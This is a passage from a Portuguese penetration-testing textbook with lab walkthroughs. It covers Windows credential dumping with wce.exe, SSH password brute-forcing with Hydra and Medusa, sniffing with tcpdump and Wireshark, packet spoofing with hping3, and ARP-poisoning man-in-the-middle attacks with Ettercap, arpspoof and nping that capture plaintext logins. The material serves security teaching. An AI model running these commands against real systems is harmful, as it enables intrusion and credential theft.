acesso\tao\tservidor.\t\nA\ttécnica\t\npass-the-hash\t\né\tválida\npara\tversões\tantigas\tdo\tWindows\t(como\to\tWindows\tXP\te\tWindows\t2003),\tpor\nesse\tmotivo\tessa\ttécnica\tnão\tserá\texplorada\tno\tlivro,\tmas\thá\texcelentes\tartigos\te\ntutoriais\tna\tinternet\tque\texploram\tmelhor\tessa\ttécnica.\nA\tversão\tmais\tmoderna\tdessa\ttécnica\té\to\tWindows\tCredentials\tEditor,\tque\npossibilita\tobter\to\ttexto\tclaro\tdo\thash\tde\tsenhas,\te,\tpor\tfim,\tconseguir\ta\tsenha.\tA\nferramenta\t\nwce.exe\n\tobtém\tos\thashs\tde\tWindows\tXP\taté\tWindows\t2008\te\ta\tsua\nutilização\té\textremamente\tsimples:\nObtenha\ta\tferramenta\tem\t\nhttp://www.ampliasecurity.com/research.html\n.\nExecute\to\t\ncmd.exe\n\tcomo\tadministrador\t(Figura\t11.1).\nC:\\\n\twce.exe\t-w\nComo\tresposta,\to\t\nwce.exe\n\textrai\ta\tsenha\tem\tclaro,\tindependentemente\tdo\ntamanho.\nWCW\tv1.41beta\t(Windows\tCredentials\tEditor)\t-\nHernan\tOchoa\t(hernan@ampliasecurity.com)\nUse\t-h\tfor\thelp.\nwin7\\PC:\ndaniel@henrique@negri@moreno\nPC$\\WORKGROUP:Figura\t11.1\t–\tExecute\to\tshell\tcomo\tadministrador.\n11.2\tEscalonamento\tde\tprivilégios\tonline\nNesse\tmétodo,\to\tauditor\tdeverá\ttestar\tas\tsenhas\tde\tforma\tonline,\tou\tseja,\tno\nmomento\tem\tque\tum\tserviço\testiver\trodando,\tserá\tfeita\ta\ttentativa\tde\tacesso\tao\nsistema\taté\tque\ta\tsenha\tseja\tencontrada.\tA\tgrande\tdesvantagem\tdesse\tmétodo\té\nque,\tdependendo\tdo\tsistema\tauditado,\tpoderá\thaver\tmecanismos\tpara\tbloqueio\nde\ttentativas\tde\tquebra\tde\tsenha.\tA\tgrande\tvantagem\té\tque\tnão\té\tnecessário\nnenhum\ttipo\tde\tpré-acesso\tao\tsistema\t(como\tlogin/senha\tde\tqualquer\tusuário)\nou\taté\tmesmo\to\thash\tdo\tarquivo\tde\tsenha.\n11.2.1\tCewl\nPermite\tfazer\ta\tcaptura\tde\tpalavras\tde\twebsites\tpara\telaboração\tde\t\nwordlists.\nroot@kali#\t\ncewl\t192.168.1.102\t--write\t/root/Desktop/lista_cewl\t-e\n11.2.2\txHydra\nFerramenta\tpara\tquebra\tde\tsenhas\tonline.\tSuporta\tdiversos\ttipos\tde\tprotocolos,\ncomo\tHTTP,\tFTP,\tPOP3,\tSMB\tetc.\tFunciona\ttestando\tnomes\tdeusuário\te\tsenha,\ncaso\tas\tcredenciais\tsejam\tencontradas,\to\txHydra\texibe\tuma\talerta.\n11.2.2.1\tLaboratório\txHydra\nroot@debian#\t\nservice\tssh\tstartroot@kali#\t\nxhydra\nA\tfigura\t11.2\tmostra\ta\ttela\tinicial\tdo\txHydra.\nFigura\t11.2\t–\tTela\tinicial\tdo\txHydra.\nNa\taba\t\nTarget\n,\to\talvo\tpode\tser\tselecionado.\nPode\tser\tselecionado\ttanto\t\nSingle\tTarget\n,\tpara\trealizar\ttestes\tde\tquebra\tde\tsenha\ncontra\tum\túnico\talvo,\tou\t\nTarget\tList\n,\tcontendo\tuma\tlista\tde\talvos\ta\tserem\ntestados.\tTambém\té\tselecionada\ta\tporta\tem\tque\tserá\trealizado\to\tprocesso\tde\nquebra\tde\tsenhas\t(a\tporta\tpadrão\tdo\tSSH\té\ta\t22)\te\to\tprotocolo\tusado\t(SSH).\nA\topção\t\nBe\tverbose\n\texibe\to\tresultado\tdetalhado\te\t\nShow\tAttempts\n\tmostra\tas\ntentativas\tde\tconexões\tfalhas.\nNa\taba\t\nPasswords\n\té\tpossível\tconfigurar\to\txHydra\tpara\ttentar\tum\túnico\tnome\tde\nusuário\tcom\ta\topção\t\nUsername\n\tou\tuma\tlista\tdeles\tpor\tmeio\tda\topção\t\nUsername\nList\n,\tconforme\tmostra\ta\tfigura\t11.3.\nAinda\té\tpossível\tconfigurar\to\tHydra\tpara\ttentar\tuma\túnica\tsenha\tpor\tmeio\tda\nopção\t\nPassword\n\tou\tuma\t\nwordlist\n\tpor\tmeio\tda\topção\t\nPassword\tList\n.Figura\t11.3\t–\tTela\tde\tseleção\tpassword.\nComo\tprimeiro\tteste,\tescolha\ta\topção\t\nUsername\n\t(com\to\tnome\troot)\te\nPassword\n(digite\ta\tsenha\tdo\troot).\nApós\tesse\tprimeiro\tlaboratório,\tencorajo\to\tleitor\ta\tutilizar\tuma\tlista\tde\tpalavras\npor\tmeio\tda\topção\t\nPassword\tList\n.\nInicie\to\tataque\tna\taba\t\nStart\n,\tconforme\tmostra\ta\tfigura\t11.4.\nFigura\t11.4\t–\tA\tquebra\tde\tsenhas\tfoi\trealizada\tcom\tsucesso.\n\t\nNota:\n\tdesafio\to\tleitor\ta\tinserir\tnovos\tusuários\tno\tsistema\tDebian\te\trealizar\to\tprocedimento\tcom\to\nxHydra\tpara\tcada\tum\tdeles.\n\t11.2.3\tHydra\nO\txHydra\tnada\tmais\té\tdo\tque\ta\tinterface\tgráfica\tdo\tHydra.\tO\tHydra\té\texecutado\nvia\tterminal\te\ttem\tas\tmesmas\tfuncionalidades\tda\tsua\tinterface\tgráfica\t(xHydra).\nhydra\t[\nopções\n]\t\nhost\tmódulo\nOpções:\n-l\n\t\nusuário\nNome\tde\tusuário.\n-L\n\t\nlista\nLista\tde\tusuários.\n-p\n\t\nsenha\nSenha.\n-P\ndicsenhas\nLista\tde\tsenhas.\n-S\nHabilita\tSSL.\n-s\n\t\nporta\nCaso\to\tserviço\tnão\testeja\tna\tsua\tporta\tpadrão,\tutilize\tessa\topção.\n-e\n\t\nvalor\nO\t\nvalor\n\tpode\tassumir\t\nn\n\t(login\tsem\tsenha),\t\ns\n\t(usar\to\tnome\tde\tlogin\tcomo\tsenha)\tou\t\nr\n\t(login\tinverso\ncomo\tsenha).\nhost\nNome\tdo\thost.\nmódulo\nMódulo\tque\tse\tdeseja\tusar.\nExemplos:\nroot@kali#\t\nhydra\t-l\troot\t-p\ttoor\tssh://192.168.1.102\nroot@kali#\n\thydra\t-l\troot\t-p\ttoor\t192.168.1.102\tssh\n11.2.4\tMedusa\nFerramenta\tsemelhante\tao\tHydra.\nOpções:\n-h\n\t\nIP\nEndereço\tIP.\n-H\t\ndic_IP\nLista\tcom\tos\tendereços\tIPs\ta\tserem\ttestados.\n-u\t\nusuário\nUsuário.\n-U\n\t\ndicusuário\nLista\tde\tusuários.\n-p\n\t\nsenha\nSenha.\n-P\n\t\ndicsenha\nLista\tde\tsenhas.-M\n\t\nmódulo\nNome\tdo\tmódulo\tsem\t\n.mod\n\t(encontrado\tem\t\n/usr/lib/medusa/modules\n)\tou\t[TAB].\n-m\n\t\nparâmetro\nUsado\topcionalmente\tcom\t\n–M\n\tpara\tacertar\tdetalhes\tdo\tmódulo.\n-q\nUsado\tjuntamente\tcom\t\n–M\n\tpara\tajuda\tdo\tmódulo.\n-e\nOpções\textras.\n-s\nHabilita\tSSL.\n-n\n\t\nporta\nCaso\to\tserviço\tnão\testeja\tna\tsua\tporta\tpadrão,\tutilize\tessa\topção.\nExemplo\tde\tuso:\nroot@kali#\t\nmedusa\t–h\t192.168.1.102\t–u\troot\t–p\ttoor\t–M\tssh\n11.3\tSniffers\nSniffers\tsão\tsoftwares\tusados\tna\tcaptura\tdo\ttráfego\tde\tdados\tda\trede\tpara\nmonitorar\te\tinterceptar\tos\tdados\tque\tpassam\tpelo\tcomputador.\tPodem\tser\tdo\ntipo:\n•\t\nLocal\n\t–\tSniffers\tlocais\tinterceptam\tos\tdados\tsomente\tdestinados\tà\tmáquina\nlocal\te\tnão\tconseguem\tfazer\ta\tcaptura\tde\tdados\tremotos.\tExemplos\tde\nsniffers\tlocais\tsão\to\ttcpdump\te\to\tWireshark.\n•\t\nRemoto\n\t–\tSniffers\tremotos\tinterceptam\to\ttráfego\tde\tdados\tremotamente.\tOu\nseja,\tconseguem\tinterceptar\to\ttráfego\tde\tdados\tnão\tdestinado\tsomente\tà\nmáquina\tlocal,\te\tsim\ta\ttodas\tas\tmáquinas\tda\trede\t(somente\tLAN).\tUm\nexemplo\tde\tsniffer\tremoto\té\to\tEttercap\tou,\taté\tmesmo,\to\ttcpdump,\tse\ta\trede\nestiver\tconfigurada\tcom\tum\thub.\n•\t\nAtivo\n\t–\tSniffers\tativos\tinterceptam\to\ttráfego\tde\tdados,\tmas\tpara\tisso\tdevem\nmodificar\tprotocolos\tde\trede.\tNormalmente\talteram\to\tprotocolo\tARP.\tUm\nexemplo\tde\tsniffer\tativo\té\to\tEttercap.\n•\t\nPassivo\n\t–\tSniffers\tpassivos\tinterceptam\to\ttráfego\tde\tdados\tde\tmaneira\npassiva,\tsem\trealizar\tnenhuma\talteração\tem\tprotocolos,\tapenas\tcom\ta\ninterface\tde\trede\tescutando\tem\tmodo\tpromíscuo.\tExemplos\tde\tsniffers\npassivos\tsão\to\ttcpdump\te\to\tWireshark.\nSniffers\tde\trede\tconseguem\trealizar\ta\tcaptura\tde\tdados\tpela\tcapacidade\tde\ttrocar\na\tinterface\tde\trede\tpelo\tmodo\tpromíscuo.\tUma\tinterface\tde\trede\tpode\tapresentar\no\tmodo\ttradicional\te\to\tmodo\tpromíscuo.•\t\nModo\ttradicional\n\t–\tQuando\tuma\tinterface\tapresenta-se\tno\tmodo\ttradicional,\nnão\tconsegue\tefetuar\ta\tcaptura\tdo\ttráfego\tde\tdados.\n•\t\nModo\tpromíscuo\n\t–\tQuando\tuma\tinterface\tse\tapresenta\tno\tmodo\tpromíscuo,\nconsegue\trealizar\ta\tcaptura\tdo\ttráfego\tde\tdados.\tEm\tuma\trede\tcom\thub,\to\nmodo\tpromíscuo\tcaptura\ttodos\tos\tdados\tda\trede,\tinclusive\tdados\tnão\ndestinados\tà\tprópria\tmáquina.\n11.3.1\tSniffer\ttcpdump\nO\ttcpdump\té\tum\tsniffer\tde\trede\tque\trealiza\ta\tcaptura\tdos\tpacotes\tde\trede\tpor\nmeio\tde\tfiltros\te\tapresenta\tdiversas\topções\tde\tfiltragem.\tPor\texemplo,\tpode-se\naplicar\tum\tfiltro\tpara\tcapturar\tsomente\tdados\tHTTP.\tCaso\texecutado\tsem\tfiltros,\no\ttcpdump\tvai\tmostrar\ttodos\tos\tpacotes\tcapturados.\ntcpdump\t[\nopções\n]\t[\nfiltro\n]\nOpções:\n-i\t\niface\nEscolhe\ta\tinterface.\n-n\nNão\tresolve\tIP\tpara\thostname.\n-nn\nNão\tresolve\tIP\tpara\thostname\tnem\tnomes\tde\tportas.\n-v\nModo\tdetalhado.\tAumenta\tcom\to\tuso\tde\t\n–vv\n\tou\t\n-vvv\n.\n-X\nImprime\tos\tcabeçalhos\tdos\tpacotes\tem\thexa\te\tem\tASCII.\n-s\t\nnum\nDefine\to\ttamanho\tde\tbytes\ta\tserem\tcapturados.\tPor\tpadrão\té\tdefinido\tum\ttamanho\tde\t96\tbytes.\tCaso\to\tpacote\nseja\tmaior,\té\trecomendado\to\tuso\tdo\t0,\tque\tcaptura\to\tpacote\tcompleto.\n-c\t\nnum\nLimita\to\tnúmero\tde\tpacotes\tcapturados\tpara\t\nnum\n.\n-q\nModo\t\nquiet\n.\tNão\texibe\tinformações\tdetalhadas.\n-S\nImprime\to\tnúmero\tde\tsequência.\n-w\narquivo\nGrava\ta\tsaída\tdo\ttcpdump\tem\tum\tarquivo.\nFiltro:\nand\nOperador\tlógico\tE.\nor\nOperador\tlógico\tOU.\nhost\t\nhost1\nCaptura\ttodos\tos\tpacotes\tde\thostname\t\nhost1\n.ip\tsrc\t\nip_origem\nIP\tde\torigem.\nip\tdst\t\nip_destino\nIP\tde\tdestino.\nport\t\nporta\nPorta.\nsrc\tport\t\nporta\nPorta\tde\torigem.\ndst\tport\t\nporta\nPorta\tde\tdestino.\nExemplos:\n1\n.\tCaptura\tsimples.\tCaptura\tqualquer\tdado\tcom\tdestino\tà\tmáquina\tlocal\nroot@kali#\n\ttcpdump\t\n–n\n2\n.\tImprimir\tdetalhes\tdo\tpacote\tHTTP\nroot@kali#\t\ntcpdump\t\n–nqX\n3\n.\tTráfego\tcom\tdestino\tao\tDebian\nroot@kali#\t\ntcpdump\t–nqX\t\nip\tdst\n\t192.168.1.102\n4\n.\tTráfego\tcom\tdestino\tao\tDebian\te\torigem\tdos\tdados\tcomo\tsendo\to\tIP\n192.168.1.100\nroot@kali#\t\ntcpdump\t–nqX\tip\tdst\t192.168.1.102\t\nand\n\t\nip\tsrc\n\t192.168.1.100\n5\n.\tTráfego\tcom\tdestino\tao\tIP\t192.168.1.102\te\tporta\t22\t(SSH)\nroot@kali#\n\ttcpdump\t–nqX\tip\tdst\t192.168.1.102\tand\t\nport\t22\nroot@kali#\t\nssh\t192.168.1.102\n6\n.\tTráfego\tcom\tdestino\tao\tIP\t192.168.1.101\te\tporta\t21\t(FTP)\nroot@kali#\t\ntcpdump\t–nqX\tip\tdst\t192.168.1.101\tand\t\ntcp\tport\t21\n7\n.\tTráfego\tdestinado\tao\thost\t(não\timporta\tse\to\thost\té\torigem\tou\tdestino)\nroot@kali#\t\ntcpdump\t–nqX\t\nhost\n\t192.168.1.102\n8\n.\tCaptura\tsomente\tum\tpacote\nroot@kali#\t\ntcpdump\t–nqX\thost\t192.168.1.102\t\n-c\t1\n9\n.\tTráfego\tdestinado\tao\thost\t192.168.1.102\te\tporta\tde\torigem\t80\nroot@kali#\t\ntcpdump\t–nqX\thost\t192.168.1.102\tand\t\nsrc\tport\n\t80\n10\n.\tTráfego\tdestinado\tao\thost\t192.168.1.102\te\tporta\tde\tdestino\t80\nroot@kali#\t\ntcpdump\t–nqX\thost\t192.168.1.102\tand\t\ndst\tport\n\t8011\n.\tPacote\tICMP\nroot@kali#\t\ntcpdump\t–nnqX\t-c\t2\t\nicmp\n11.3.2\tSniffer\tWireshark\nSniffer\tpara\tmonitoramento\tde\tpacotes.\tConsegue\tcapturar\te\tdecodificar\tvários\ntipos\tde\tprotocolos,\tnão\tapenas\to\tTCP/IP.\tPode\tser\tutilizado\tcom\tlinha\tde\ncomando\t(tshark)\tou\tcom\tinterface\tgráfica\t(Wireshark).\n11.3.2.1\tLaboratório\tWireshark\nO\tWireshark\tpossibilita\ta\tutilização\tde\tfiltros,\tque\tfiltram\to\tresultado\tde\tacordo\ncom\to\tparâmetro\tdesejado.\tAlguns\tfiltros\tque\tserão\tutilizados\tpara\to\tlaboratório:\nHTTP\nProtocolo\tHTTP\nICMP\nProtocolo\tICMP\nTCP\nProtocolo\tTCP\nip.dst==\nIP\tde\tdestino\nip.src==\nIP\tde\torigem\ntcp.dstport==\nPorta\tde\tdestino\ntcp.srcport==\nPorta\tde\torigem\nand\nOperador\tlógico\tE\nor\nOperador\tlógico\tOU\nInicie\to\tWireshark:\nroot@kali#\n\twireshark\nSelecione\ta\tinterface\tque\tse\tdeseja\tpara\trealizar\ta\tcaptura\tdos\tdados,\tconforme\nmostra\ta\tfigura\t11.5.Figura\t11.5\t–\tSelecione\ta\tinterface\tem\tque\to\tWireshark\tfará\ta\tcaptura\tremota\ndos\tdados.\nO\tbotão\tvermelho\t(botão\tà\tdireita)\tindica\tpara\to\tWireshark\tparar\ta\tcaptura.\nO\tbotão\tverde\t(botão\tà\tesquerda)\tindica\tpara\to\tWireshark\tiniciar\tuma\tnova\ncaptura.\nOs\tlaboratórios\tserão\tefetuados\tsobre\ta\taba\t\nFilter\n,\tconforme\tindica\ta\tfigura\t11.6.\nFigura\t11.6\t–\tTela\tdo\tWireshark.\nExemplos:\n1\n.\tCapturando\tpacotes\tICMP\nroot@kali#\n\tping\t192.168.1.102\nNo\tWireshark:\nFilter:\t\nicmp2\n.\tCapturando\tpacotes\tARP\tRequest\nroot@kali#\n\tarping\t192.168.1.102\nNo\tWireshark:\nFilter:\t\narp\n3\n.\tCapturando\tpacotes\tSYN\tcom\tdestino\tà\tporta\t22\nroot@kali#\t\nhping3\t-S\t-p\t22\t192.168.1.102\nNo\tWireshark:\nFilter:\t\nip.dst==192.168.1.102\tand\ttcp.dstport==22\n4\n.\tPacotes\tUDP\tcom\tdestino\tà\tporta\t53\nroot@kali#\n\thping3\t-2\t-p\t53\t192.168.1.102\nNo\tWireshark:\nFilter:\t\nip.dst==192.168.1.102\tand\tudp.dstport==53\n5\n.\tPacotes\tcom\torigem\tfalsa\nroot@kali#\n\thping3\t-S\t-p\t80\t--spoof\t1.2.3.4\t192.168.1.1\nNo\tWireshark:\nFilter:\t\nip.dst==192.168.1.1\tand\tip.src==1.2.3.4\n6\n.\tPacotes\tcom\tdestino\taleatório\nroot@kali#\n\thping3\t-S\t-p\t80\t--rand-dest\tx.x.x.x\t-I\teth0\nroot@kali#\n\thping3\t-S\t-p\t80\t--rand-dest\t1.1.1.x\t-I\teth0\nNo\tWireshark\tnão\taplique\tnenhum\tfiltro.\n7\n.\tPacotes\tcom\tdestino\tao\tIP\t192.168.1.102\te\tporta\tde\torigem\t666\nroot@kali#\n\thping3\t-S\t-p\t80\t-s\t666\t192.168.1.102\nNo\tWireshark:\nFilter:\t\nip.dst==192.168.1.102\tand\ttcp.srcport==666\n8\n.\tCapturando\tpacotes\tHTTP\nAcesse\tuma\tpágina\tHTTP\nNo\tWireshark:\nFilter:\t\nhttp\n9\n.\tCapturando\tconexão\tFTPInicie\tum\tservidor\tFTP\tno\tWindows\nroot@kali#\t\nftp\t192.168.1.101\nNo\tWireshark:\nFilter:\t\nftp\n11.4\tAtaques\tMan-in-the-Middle\t(MitM)\nAtaque\tMan-in-the-Middle\tprovavelmente\té\to\ttipo\tde\tataque\tmais\tpotente\tcontra\numa\trede.\tNesse\ttipo\tde\tataque,\to\tatacante\tficará\tna\tescuta\tda\trede,\tou\tseja,\ninterceptará\ta\tconexão\tentre\to\thost\tA\te\to\thost\tB,\tficando\tno\tmeio\tda\tconexão.\nPor\testar\tassumindo\tuma\tfunção\tde\tintermediário,\to\tMan-in-the-Middle\tpode\nefetuar\tataques\tde\tcaptura,\tleitura\te\tredirecionamento\tdo\ttráfego.\nO\ttráfego\tnormal\tocorre\tde\tuma\textremidade\taté\toutra,\tconforme\tmostra\ta\tfigura\n11.7.\nFigura\t11.7\t–\tTráfego\tnormal\tde\tdados.\nEm\tum\tataque\tMan-in-the-Middle,\to\ttráfego\tde\tdados\té\tredirecionado\tpara\ta\nmáquina\tdo\tatacante,\tconforme\tmostra\ta\tfigura\t11.8.\nFigura\t11.8\t–\tTráfego\tde\tdados\tem\tum\tataque\tMitM.\n11.4.1\tARP\tSpoofing\nUm\tdos\tmaiores\tproblemas\tde\tredes\té\to\tuso\tde\tsniffers.\tComo\testudado\nanteriormente,\to\tsniffer\tusado\t(Wireshark)\tpossibilita\ta\tcaptura\tdo\ttráfego\tlocal.\nCaso\tseja\tmonitorada\tuma\trede\tcom\thub\tpara\tgerenciamento\tdo\ttráfego,\to\nWireshark\tfaz\ta\tcaptura\tdo\ttráfego\tde\ttodas\tas\tmáquinas\tda\trede.\nPorém\to\tatacante\tencontrará\tproblemas\tcaso\ta\trede\tapresente\tum\tswitch.\tNesse\ntipo\tde\trede\t(ao\tcontrário\tdo\thub\t–\tque\tfaz\to\tencaminhamento\tdo\ttráfego\tdedados\tpara\ttodas\tas\tmáquinas\tda\trede),\to\ttráfego\tde\tdados\té\tredirecionado\nsomente\tpara\to\thost\tcorreto.\tCom\tisso,\tainda\tque\to\tatacante\ttenha\tsua\tinterface\nem\tmodo\tpromíscuo,\tessa\tmedida\tserá\tpouco\tefetiva,\tpois,\tmesmo\tque\to\tmodo\npromíscuo\tcapture\to\ttráfego\tde\tdados\tdas\tmáquinas\tda\trede,\to\tswitch\nsimplesmente\tnão\tenvia\tdados\tda\trede\tpara\to\tatacante.\nContudo,\tesse\tmecanismo\tde\tdefesa\tpode\tser\tburlado\tcom\ttécnicas\tde\tARP\nPoisoning,\tque\tconsistem\tno\tforjamento\tde\tpacotes\tARP\tnas\tduas\tdireções\tda\ncomunicação.\nEm\tum\tataque\tARP\tSpoofing,\to\tatacante\tC\tmanipula\to\tpacote\tARP\tReply\ndizendo\tao\thost\tA\tque\to\tendereço\tIP\tde\tB\tcorresponde\tao\tendereço\tMAC\tde\tC;\ne\tmanipula\to\tpacote\tARP\tReply\tdizendo\tao\thost\tB\tque\to\tendereço\tIP\tde\tA\ncorresponde\tao\tendereço\tMAC\tde\tC.\nExemplo:\nIPxMAC\toriginais\nHost\tA\nIP\t192.168.1.2\nMAC\tAA:AA:AA:AA:AA:AA\nHost\tB\nIP\t192.168.1.1\nMAC\tBB:BB:BB:BB:BB:BB\nHost\tC\nIP\t192.168.1.3\nMAC\tCC:CC:CC:CC:CC:CC\nAntes\tdo\tenvenenamento\nTabela\tARP\t(Host\tA)\n192.168.1.1\nBB:BB:BB:BB:BB:BB\n192.168.1.3\nCC:CC:CC:CC:CC:CC\nApós\tenvenenamento\nTabela\tARP\t(Host\tA)\n192.168.1.1\nCC:CC:CC:CC:CC:CC\n192.168.1.3\nCC:CC:CC:CC:CC:CC\n11.4.1.1\tLaboratório\tARP\tSpoofing:\tEttercap\nObserve\ta\ttabela\tARP\tdo\tWindows\tantes\tdo\tenvenenamento,\tpor\tmeio\tdo\ncomando\t\narp\t-a\n.\nC:\\\n\tarp\t-a\nInterface:\t192.168.1.101\t---\t0xbInterface:\t192.168.1.101\t---\t0xb\nEndereço\tInternet\t\t\tEndereço\tfísico\tTipo\n192.168.1.1\t\t\t\t\t\t\t74-ea-3a-e1-e8-66\tdinâmico\n192.168.1.100\t\t\t\t\t00-23-15-73-86-6c\tdinâmico\n192.168.1.102\t\t\t\t\t9a-e0-3d-8f-23-a1\tdinâmico\n192.168.1.255\t\t\t\t\tff-ff-ff-ff-ff-ff\testático\nEndereços\tIP\t(endereço\tinternet)\tcom\tendereços\tMAC\t(endereço\tfísico)\ndiferentes\tpara\tcada\tmáquina.\n•\tHabilite\to\troteamento\tde\tpacotes\t(IP\tForward):\nroot@kali#\n\techo\t1\t>\t/proc/sys/net/ipv4/ip_forward\n•\tAltere\to\tarquivo\t\n/etc/ettercap/etter.conf\n:\n•\tModifique\ta\tseguinte\tlinha:\n[privs]\nec_uid\t=\t65534\t#nobody\tis\tthe\tdefault\nec_gid\t=\t65534\t#nobody\tis\tthe\tdefault\nPara:\n[privs]\nec_uid\t=\t0\t\t#nobody\tis\tthe\tdefault\nec_gid\t=\t0\t\t#nobody\tis\tthe\tdefault\n•\tDescomente\tas\tlinhas:\n#\tIF\tyou\tuse\tiptables:\nredir_command_on\t=\t\"iptables\t–t\tnat\t–A\tPREROUTING\t-i\t%iface\t–p\ttcp\t--dport\t%port\t–j\tREDIRECT\n--to-port\t%rport\"\nredir_command_off\t=\t\"iptables\t–t\tnat\t–D\tPREROUTING\t-i\t%iface\t–p\ttcp\t--dport\t%port\t–j\nREDIRECT\t--to-port\t%rport\"\n•\tInicialize\to\tEttercap:\nroot@kali#\n\tettercap\t-TqM\tarp\t//\t//\nO\tEttercap\tserá\tiniciado\tem\tmodo\ttexto\t(opção\t\n-T\n)\te\tlistará\tos\tdados\tem\tforma\nsilenciosa\t(opção\t\n-q\n),\tnão\texibindo\ttudo\to\tque\tcaptura,\tapenas\to\tessencial,\tou\nseja,\tapenas\tas\tsenhas.\tE,\tpor\túltimo,\tsão\tselecionados\tquais\tos\thosts\tque\nsofrerão\to\tenvenenamento\tARP.\tNo\texemplo,\t//\t//\tindica\ttodos\tos\thosts\tda\trede.\nEntão\tfaremos\to\tenvenenamento\tARP\tpara\ttodas\tas\tmáquinas\tda\tLAN.\tMas\npoderíamos\tselecionar,\tpor\texemplo,\to\tenvenenamento\tapenas\tentre\tos\thosts\n192.168.1.110\te\t192.168.1.120\ttrocando\t//\t//\tpor\t/192.168.1.110/\n/192.168.1.1.120/.\tPoderíamos\ttambém\tselecionar\to\tenvenenamento\tentre\ttodosos\thosts\te\to\thost\t192.168.1.110\tpor\tmeio\tde\t//\t/192.168.1.110/.\nObserve\ta\ttabela\tARP\tdo\tWindows\tapós\to\tenvenenamento,\tpor\tmeio\tdo\ncomando\t\narp\t-a\n.\nC:\\\n\tarp\t-a\nInterface:\t192.168.1.101\t---\t0xb\nEndereço\tInternet\tEndereço\tfísico\tTipo\n192.168.1.1\t00-23-15-73-86-6c\tdinâmico\n192.168.1.100\t00-23-15-73-86-6c\tdinâmico\n192.168.1.102\t00-23-15-73-86-6c\tdinâmico\n192.168.1.255\tff-ff-ff-ff-ff-ff\testático\nTodos\tos\tendereços\tfísicos\t(com\texceção\tdo\tendereço\tde\tbroadcast\n192.168.1.255)\tforam\talterados\tpara\to\tendereço\tMAC\tdo\tatacante.\nAcesse\tqualquer\tsite\tque\ttenha\tHTTP.\tNo\texemplo,\tvou\tacessar\to\tendereço\nhttp://192.168.1.1\n.\nO\tEttercap\trealiza\ta\tcaptura\tremota\tdo\ttráfego\tde\tdados.\tSe,\tpor\texemplo,\tum\nhost\tenvenenado\tacessa\tum\tsite\tHTTP\te\ttransmite\tas\tsuas\tsenhas\tem\tclaro\tpela\nrede,\to\tEttercap\trealiza\ta\tcaptura\tdo\tusuário\te\tsenha.\nettercap\t0.8.0\tcopyright\t2001-2013\tEttercap\tDevelopment\tTeam\nListening\ton:\nwlan0\t->\t00:23:15:73:86:6C\n\t\t\t\t\t\t\t\t\t\t192.168.1.100/255.255.255.0\n\t\t\t\t\t\t\t\t\t\tfe80::223:15ff:fe73:866c/64\nPrivileges\tdropped\tto\tUID\t0\tGID\t0...\n\t\t33\tplugins\n\t\t42\tprotocol\tdissectors\n\t\t57\tports\tmonitored\n16074\tmac\tvendor\tfingerprint\n1766\ttcp\tOS\tfingerprint\n2182\tknown\tservices\nRandomizing\t255\thosts\tfor\tscanning...\nScanning\tthe\twhole\tnetmask\tfor\t255\thosts...\n*\t|==================================================>|\t100.00\t%\n5\thosts\tadded\tto\tthe\thosts\tlist...\nARP\tpoisoning\tvictims:\nGROUP\t1\t:\tANY\t(all\tthe\thosts\tin\tthe\tlist)\nGROUP\t2\t:\tANY\t(all\tthe\thosts\tin\tthe\tlist)\nStarting\tUnified\tsniffing...\nText\tonly\tInterface\tactivated...\nHit\t'h'\tfor\tinline\thelpHit\t'h'\tfor\tinline\thelp\nHTTP\t:\t192.168.1.1:80\t->\tUSER:\tadmin\t\tPASS:\tadmin\n\t\tINFO:\t192.168.1.1/\nSai\tdo\tEttercap\tcom\ta\ttecla\t\nq\n.\nO\tARP\tSpoofing\ttambém\tpode\tser\trealizado\tpor\tmeio\tdo\tutilitário\tArpspoof\te\ndo\tNping.\n11.4.2\tArpspoof\nO\tArpspoof\té\tum\tprograma\tdesenvolvido\tpelo\tDug\tSong\te\té\tbem\teficaz\tna\nrealização\tde\tataques\tde\tARP\tSpoofing.\tPossui\to\tmesmo\tfuncionamento\tdo\nEttercap,\tporém,\tpara\tutilizarmos\tessa\tferramenta,\to\tenvenenamento\tARP\tdeve\nser\trealizado\tmanualmente.\nEntão,\tpor\texemplo,\tvamos\tenvenenar\to\thost\t192.168.1.110:\narpspoof\t-i\tinterface\t-t\talvo\thost\nOpções:\n-i\nCaso\ta\tinterface\tpara\to\tARP\tSpoofing\tnão\tseja\ta\t\neth0\n,\tselecione-a\tcom\tessa\topção.\n-t\t\nalvo\nSelecione\to\talvo\ta\tser\tenvenenado\t(ponto\t1).\nhost\nSelecione\to\thost\ta\tser\tenvenenado\t(ponto\t2).\nPara\trealizar\to\tataque\tde\tARP\tSpoofing,\tprimeiro\thabilite\to\troteamento\tde\npacotes\t(IP\tForward):\nroot@kali#\n\techo\t1\t>\t/proc/sys/net/ipv4/ip_forward\nPara\trealizar\to\tenvenenamento,\tpor\texemplo,\tentre\to\thost\t192.168.1.110\te\to\nroteador\t192.168.1.1:\nroot@kali#\n\tarpspoof\t-t\t192.168.1.1\t192.168.1.110\nDevemos\tcapturar\tos\tpacotes\tde\tvolta\tentre\to\troteador\t192.168.1.1\te\to\thost\n192.168.1.110:\nroot@kali#\n\tarpspoof\t-t\t192.168.1.110\t192.168.1.1\nInicie\ta\tcaptura\tcom\to\tWireshark:\nroot@kali#\n\twireshark\nAcesse\tum\tsite\tHTTP\tpor\tmeio\tdo\thost\t192.168.1.110\te\tveja\to\tresultado\tno\nWireshark.11.4.3\tNping\nO\tutilitário\tNping\té\texcelente\tpara\tmanipulação\tde\tpacotes.\tCom\to\tNping\té\npossível\tcriar\trequisições\tARP\tReply\tenvenenadas\tpara\to\thost.\nPara\trealizar\to\tataque\tde\tARP\tSpoofing\tcom\to\tNping,\tprimeiro\thabilite\to\nroteamento\tde\tpacotes\t(IP\tForward).\nroot@kali#\n\techo\t1\t>\t/proc/sys/net/ipv4/ip_forward\nDa\tmesma\tforma\tque\to\tArpspoof,\tdevemos\tenvenenar\tambos\tos\thosts\t(ponto\t1\te\n2):\nroot@kali#\n\tnping\t--arp-type\tarp-reply\t--source-ip\t192.168.1.1\t192.168.1.110\t-c\t0\nroot@kali#\n\tnping\t--arp-type\tarp-reply\t--source-ip\t192.168.1.110\t192.168.1.1\t-c\t0\n11.4.4\tDNS\tSpoofing\nO\tDNS\tSpoofing\tconsiste\tem\tredirecionar\to\ttráfego\tde\tum\tDNS\tpara\toutro\nDNS.\tPor\texemplo,\tquando\to\tcliente\tacessa\t\nsite.com.br\n\t(IP\tX.X.X.X),\tele\té\nredirecionado\tao\t\nsitefalso.com.br\n\t(IP\tY.Y.Y.Y).\n•\tInicie\to\tservidor\tApache:\nroot@kali#\n\tservice\tapache2\tstart\n•\tAltere\to\tarquivo\t\n